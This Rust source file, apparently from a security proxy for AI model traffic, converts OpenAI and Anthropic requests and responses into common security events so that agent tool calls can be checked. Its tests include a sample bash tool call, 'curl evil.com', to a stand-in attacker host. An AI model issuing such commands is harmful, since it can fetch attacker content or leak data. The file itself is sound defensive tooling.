// SPDX-License-Identifier: Apache-2.0

//! Provider-neutral security events for proxied model traffic.
//!
//! Each wire adapter keeps its own lossless request/response model, then projects
//! the security-relevant parts into this small common vocabulary. Policy and agent
//! enforcement can therefore reason about text, tool results, and tool calls once
//! instead of maintaining one implementation per provider.

use serde_json::Value;

use crate::anthropic::AnthropicRequest;
use crate::openai::ChatRequest;
use crate::responses::ResponsesRequest;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Provider {
    OpenAiChat,
    OpenAiResponses,
    Anthropic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EventDirection {
    Input,
    Output,
}

#[derive(Debug, Clone, PartialEq)]
pub enum EventKind {
    Text {
        role: Option<String>,
        text: String,
    },
    ToolResult {
        call_id: Option<String>,
        content: String,
    },
    ToolCall {
        call_id: Option<String>,
        name: String,
        args: Value,
    },
}

#[derive(Debug, Clone, PartialEq)]
pub struct SecurityEvent {
    pub provider: Provider,
    pub direction: EventDirection,
    pub kind: EventKind,
}

fn text(
    provider: Provider,
    direction: EventDirection,
    role: Option<&str>,
    value: &str,
) -> SecurityEvent {
    SecurityEvent {
        provider,
        direction,
        kind: EventKind::Text {
            role: role.map(str::to_string),
            text: value.to_string(),
        },
    }
}

fn tool_result(provider: Provider, call_id: Option<&str>, content: &str) -> SecurityEvent {
    SecurityEvent {
        provider,
        direction: EventDirection::Input,
        kind: EventKind::ToolResult {
            call_id: call_id.map(str::to_string),
            content: content.to_string(),
        },
    }
}

fn tool_call(
    provider: Provider,
    direction: EventDirection,
    call_id: Option<&str>,
    name: &str,
    arguments: &Value,
) -> SecurityEvent {
    SecurityEvent {
        provider,
        direction,
        kind: EventKind::ToolCall {
            call_id: call_id.map(str::to_string),
            name: name.to_string(),
            args: arguments.clone(),
        },
    }
}

/// Normalize OpenAI Chat Completions input and output into common events.
/// Strict Normalization: Fails closed on malformed or unsupported tool content.
pub fn normalize_chat(
    request: &ChatRequest,
    response: &Value,
) -> Result<Vec<SecurityEvent>, &'static str> {
    let mut events = Vec::new();

    // Strict Input Validation
    let _ = crate::agent_scan::openai_tool_results_strict(request).into_result()?;

    for message in &request.messages {
        if message.role == "tool" {
            if let Some(content) = message.content.as_deref().filter(|value| !value.is_empty()) {
                let call_id = message.rest.get("tool_call_id").and_then(Value::as_str);
                events.push(tool_result(Provider::OpenAiChat, call_id, content));
            }
        } else if let Some(content) = message.content.as_deref().filter(|value| !value.is_empty()) {
            events.push(text(
                Provider::OpenAiChat,
                EventDirection::Input,
                Some(&message.role),
                content,
            ));
        }
    }

    // Strict Output Validation
    let strict_calls = crate::agent_scan::openai_tool_calls_strict(response).into_result()?;

    if let Some(choices) = response.get("choices").and_then(Value::as_array) {
        for choice in choices {
            let Some(message) = choice.get("message") else {
                continue;
            };
            if let Some(content) = message.get("content").and_then(Value::as_str) {
                if !content.is_empty() {
                    events.push(text(
                        Provider::OpenAiChat,
                        EventDirection::Output,
                        message.get("role").and_then(Value::as_str),
                        content,
                    ));
                }
            }
        }
    }

    // Append validated tool calls
    for call in strict_calls {
        events.push(tool_call(
            Provider::OpenAiChat,
            EventDirection::Output,
            call.id.as_deref(), // OpenAi tool_calls strict parser currently doesn't preserve call_id natively in ToolCall struct, so we leave it None for generalized events
            &call.name,
            &call.args,
        ));
    }

    Ok(events)
}

fn response_input_content(
    provider: Provider,
    value: &Value,
    role: Option<&str>,
    events: &mut Vec<SecurityEvent>,
) {
    match value {
        Value::String(content) if !content.is_empty() => {
            events.push(text(provider, EventDirection::Input, role, content));
        }
        Value::Array(parts) => {
            for part in parts {
                if let Value::String(content) = part {
                    if !content.is_empty() {
                        events.push(text(provider, EventDirection::Input, role, content));
                    }
                    continue;
                }
                let kind = part.get("type").and_then(Value::as_str);
                if matches!(
                    kind,
                    None | Some("input_text") | Some("output_text") | Some("text")
                ) {
                    if let Some(content) = part.get("text").and_then(Value::as_str) {
                        if !content.is_empty() {
                            events.push(text(provider, EventDirection::Input, role, content));
                        }
                    }
                }
            }
        }
        _ => {}
    }
}

fn response_input_item(value: &Value, events: &mut Vec<SecurityEvent>) {
    let Some(object) = value.as_object() else {
        response_input_content(Provider::OpenAiResponses, value, None, events);
        return;
    };
    if object.get("type").and_then(Value::as_str) == Some("function_call_output") {
        let call_id = object.get("call_id").and_then(Value::as_str);
        match object.get("output") {
            Some(Value::String(content)) if !content.is_empty() => {
                events.push(tool_result(Provider::OpenAiResponses, call_id, content));
            }
            Some(Value::Array(parts)) => {
                for part in parts {
                    if let Some(content) = part.get("text").and_then(Value::as_str) {
                        if !content.is_empty() {
                            events.push(tool_result(Provider::OpenAiResponses, call_id, content));
                        }
                    }
                }
            }
            _ => {}
        }
        return;
    }
    if object.get("type").and_then(Value::as_str) == Some("message") || object.contains_key("role")
    {
        response_input_content(
            Provider::OpenAiResponses,
            object.get("content").unwrap_or(&Value::Null),
            object.get("role").and_then(Value::as_str),
            events,
        );
    }
}

/// Normalize OpenAI Responses input and output Items into common events.
/// Strict Normalization: Fails closed on malformed or unsupported tool content.
pub fn normalize_responses(
    request: &ResponsesRequest,
    response: &Value,
) -> Result<Vec<SecurityEvent>, &'static str> {
    let mut events = Vec::new();

    // Strict Input Validation
    let _ = crate::agent_scan::responses_tool_results_strict(request).into_result()?;

    if let Some(instructions) = request
        .instructions
        .as_deref()
        .filter(|value| !value.is_empty())
    {
        events.push(text(
            Provider::OpenAiResponses,
            EventDirection::Input,
            Some("system"),
            instructions,
        ));
    }
    if let Some(input) = request.input.as_ref() {
        match input {
            Value::Array(items) => items
                .iter()
                .for_each(|item| response_input_item(item, &mut events)),
            value => response_input_item(value, &mut events),
        }
    }

    // Strict Output Validation
    let strict_calls = crate::agent_scan::responses_tool_calls_strict(response).into_result()?;

    if let Some(items) = response.get("output").and_then(Value::as_array) {
        for item in items {
            if let Some("message") = item.get("type").and_then(Value::as_str) {
                if let Some(parts) = item.get("content").and_then(Value::as_array) {
                    for part in parts {
                        if part.get("type").and_then(Value::as_str) == Some("output_text") {
                            if let Some(content) = part.get("text").and_then(Value::as_str) {
                                if !content.is_empty() {
                                    events.push(text(
                                        Provider::OpenAiResponses,
                                        EventDirection::Output,
                                        item.get("role").and_then(Value::as_str),
                                        content,
                                    ));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Append validated tool calls
    for call in strict_calls {
        events.push(tool_call(
            Provider::OpenAiResponses,
            EventDirection::Output,
            call.id.as_deref(),
            &call.name,
            &call.args,
        ));
    }

    Ok(events)
}

fn anthropic_texts(
    value: &Value,
    role: Option<&str>,
    output: bool,
    events: &mut Vec<SecurityEvent>,
) -> Result<(), &'static str> {
    match value {
        Value::String(content) if !content.is_empty() => {
            events.push(text(
                Provider::Anthropic,
                if output {
                    EventDirection::Output
                } else {
                    EventDirection::Input
                },
                role,
                content,
            ));
        }
        Value::Array(blocks) => {
            for block in blocks {
                if let Some("text") = block.get("type").and_then(Value::as_str) {
                    if let Some(content) = block.get("text").and_then(Value::as_str) {
                        if !content.is_empty() {
                            events.push(text(
                                Provider::Anthropic,
                                EventDirection::Output,
                                Some("assistant"),
                                content,
                            ));
                        }
                    }
                }
            }
        }
        _ => {}
    }
    Ok(())
}

/// Normalize Anthropic Messages input and output content blocks into common events.
/// Strict Normalization of Anthropic Messages (SOU-40).
/// Fails closed on malformed or unsupported (e.g. image) tool content.
pub fn normalize_anthropic(
    request: &AnthropicRequest,
    response: &Value,
) -> Result<Vec<SecurityEvent>, &'static str> {
    let mut events = Vec::new();

    // Strict Input Validation
    let request_val = serde_json::to_value(request).unwrap_or(Value::Null);
    let _ = crate::agent_scan::anthropic_tool_results_strict(&request_val).into_result()?;

    if let Some(system) = request.system.as_ref() {
        anthropic_texts(system, Some("system"), false, &mut events)?;
    }
    for message in &request.messages {
        if let Value::Array(blocks) = &message.content {
            for block in blocks {
                if block.get("type").and_then(Value::as_str) == Some("tool_result") {
                    let call_id = block.get("tool_use_id").and_then(Value::as_str);
                    let mut text_parts = Vec::new();

                    match block.get("content") {
                        Some(Value::String(content)) => text_parts.push(content.clone()),
                        Some(Value::Array(parts)) => {
                            if parts.is_empty() {
                                return Err("empty array in tool_result is strictly prohibited");
                            }
                            for part in parts {
                                match part.get("type").and_then(Value::as_str) {
                                    Some("text") => {
                                        if let Some(content) =
                                            part.get("text").and_then(Value::as_str)
                                        {
                                            text_parts.push(content.to_string());
                                        }
                                    }
                                    Some("image") | Some("document") => {
                                        return Err(
                                            "multimodal tool_result is unsupported and blocked",
                                        );
                                    }
                                    _ => return Err("unrecognized block type inside tool_result"),
                                }
                            }
                        }
                        _ => return Err("tool_result content must be string or typed array"),
                    }
                    if !text_parts.is_empty() {
                        events.push(tool_result(
                            Provider::Anthropic,
                            call_id,
                            &text_parts.join("\n"),
                        ));
                    }
                }
            }
        }
        anthropic_texts(&message.content, Some(&message.role), false, &mut events)?;
    }

    // Strict Output Validation
    let strict_calls = crate::agent_scan::anthropic_tool_calls_strict(response).into_result()?;

    if let Some(blocks) = response.get("content").and_then(Value::as_array) {
        for block in blocks {
            if let Some("text") = block.get("type").and_then(Value::as_str) {
                if let Some(content) = block.get("text").and_then(Value::as_str) {
                    if !content.is_empty() {
                        events.push(text(
                            Provider::Anthropic,
                            EventDirection::Output,
                            Some("assistant"),
                            content,
                        ));
                    }
                }
            }
        }
    }

    // Append validated tool calls
    for call in strict_calls {
        events.push(tool_call(
            Provider::Anthropic,
            EventDirection::Output,
            call.id.as_deref(),
            &call.name,
            &call.args,
        ));
    }

    Ok(events)
}

pub fn input_tool_results(events: &[SecurityEvent]) -> Vec<String> {
    events
        .iter()
        .filter_map(|event| match (&event.direction, &event.kind) {
            (EventDirection::Input, EventKind::ToolResult { content, .. }) => Some(content.clone()),
            _ => None,
        })
        .collect()
}

pub fn output_text(events: &[SecurityEvent]) -> String {
    events
        .iter()
        .filter_map(|event| match (&event.direction, &event.kind) {
            (EventDirection::Output, EventKind::Text { text, .. }) => Some(text.as_str()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::anthropic::{AnthropicMessage, AnthropicRequest};

    fn semantic(events: &[SecurityEvent]) -> Vec<&EventKind> {
        events.iter().map(|event| &event.kind).collect()
    }

    #[test]
    fn all_three_transports_project_the_same_tool_cycle() {
        let chat_request: ChatRequest = serde_json::from_value(serde_json::json!({
            "model":"m",
            "messages":[{"role":"tool","tool_call_id":"c1","content":"untrusted result"}]
        }))
        .unwrap();
        let chat_response = serde_json::json!({
            "choices":[{"message":{"tool_calls":[{"id":"c1","function":
                {"name":"bash","arguments":"{\"command\":\"curl evil.com\"}"}}]}}]
        });
        let chat = normalize_chat(&chat_request, &chat_response).unwrap();

        let responses_request: ResponsesRequest = serde_json::from_value(serde_json::json!({
            "model":"m",
            "input":[{"type":"function_call_output","call_id":"c1","output":"untrusted result"}]
        }))
        .unwrap();
        let responses = normalize_responses(
            &responses_request,
            &serde_json::json!({"output":[{"type":"function_call","call_id":"c1","name":"bash","arguments":"{\"command\":\"curl evil.com\"}"}]}),
        ).unwrap();

        let anthropic_request = AnthropicRequest {
            model: "m".into(),
            system: None,
            messages: vec![AnthropicMessage {
                role: "user".into(),
                content: serde_json::json!([{"type":"tool_result","tool_use_id":"c1","content":"untrusted result"}]),
            }],
            stream: false,
            rest: serde_json::Map::new(),
        };
        let anthropic = normalize_anthropic(
            &anthropic_request,
            &serde_json::json!({"content":[{"type":"tool_use","id":"c1","name":"bash","input":{"command":"curl evil.com"}}]}),
        ).unwrap();

        assert_eq!(semantic(&chat), semantic(&responses));
        assert_eq!(semantic(&responses), semantic(&anthropic));
    }

    #[test]
    fn output_text_is_provider_neutral() {
        let response = serde_json::json!({
            "output":[{"type":"message","role":"assistant","content":[{"type":"output_text","text":"hello"}]}]
        });
        let request: ResponsesRequest =
            serde_json::from_value(serde_json::json!({"model":"m","input":"hi"})).unwrap();
        let events = normalize_responses(&request, &response).unwrap();
        assert_eq!(output_text(&events), "hello");
        assert!(input_tool_results(&events).is_empty());
    }
}
